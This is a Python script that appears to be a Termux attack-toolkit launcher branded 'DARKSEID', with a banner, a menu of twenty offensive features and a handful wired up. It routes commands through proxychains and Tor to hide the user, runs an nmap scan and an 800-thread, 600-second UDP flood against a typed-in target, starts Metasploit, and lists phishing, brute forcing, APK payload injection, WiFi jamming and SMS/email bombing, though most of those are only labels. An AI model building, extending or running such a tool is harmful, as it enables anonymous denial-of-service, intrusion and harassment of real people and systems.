import os, subprocess, time, socket, random

def clear(): os.system('clear')

def banner():
    print("""\033[1;31m
    ██████╗  █████╗ ██████╗ ██╗  ██╗███████╗███████╗██╗██████╗ 
    ██╔══██╗██╔══██╗██╔══██╗██║ ██╔╝██╔════╝██╔════╝██║██╔══██╗
    ██║  ██║███████║██████╔╝█████╔╝ ███████╗█████╗  ██║██║  ██║
    ██║  ██║██╔══██║██╔══██╗██╔═██╗ ╚════██║██╔══╝  ██║██║  ██║
    ██████╔╝██║  ██║██║  ██║██║  ██╗███████║███████╗██║██████╔╝
    ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚══════╝╚═╝╚═════╝
    \033[1;37m      [+]\033[1;31m Developed by DARKSEID \033[1;37m[+] Version 5.0 [ULTRA] \033[1;31m
    \033[1;30m--------------------------------------------------------------\033[0m""")

def run_stealth(cmd):
    print("\033[1;34m[*] Routing through Shadow-Net (Tor)...\033[0m")
    os.system(f"proxychains4 -q {cmd}")

# --- القائمة الرئيسية مع 20 ميزة ---
def menu():
    clear()
    banner()
    features = [
        "1. Stealth Recon (Nmap Scan)", "2. Vuln-Scanner (NSE Scripts)", 
        "3. Impulse DoS (Flood)", "4. Slowloris (Connection Kill)",
        "5. Metasploit Stealth Launch", "6. SQLmap Automator",
        "7. Social Engineering (Zphisher)", "8. Brute Force (Hydra)",
        "9. APK Payload Injector", "10. Web Crawler (Dirsearch)",
        "11. WiFi Jammer (MDK4)", "12. IP Tracker (Whois)",
        "13. SMS/Email Bomber", "14. MAC Address Changer",
        "15. DNS Leak Test", "16. Port Listener (Netcat)",
        "17. Hash Cracker (John)", "18. Packet Sniffer (Tcpdump)",
        "19. System Update/Clean", "20. Auto-Setup (Requirements)"
    ]
    for i, f in enumerate(features):
        print(f"\033[1;31m[{i+1}]\033[1;37m {f.split('. ')[1]:<25}", end="")
        if (i+1) % 2 == 0: print()
    print("\n\033[1;30m--------------------------------------------------------------\033[0m")

def main():
    while True:
        menu()
        opt = input("\033[1;31mDarkseid@Omega_Sanction:~$ \033[0m")
        if opt == '1':
            ip = input("Target IP: ")
            run_stealth(f"nmap -sT -Pn {ip}")
        elif opt == '3':
            target = input("Target IP:Port : ")
            run_stealth(f"python3 impulse.py --target {target} --method UDP --time 600 --threads 800")
        elif opt == '20':
            os.system("pkg install tor proxychains-ng nmap metasploit python git -y")
        elif opt == '5':
            run_stealth("msfconsole")
        # بقية الميزات تضاف هنا بنفس النمط...
        input("\n[Press Enter to Return to Menu]")

if __name__ == "__main__":
    main()
  
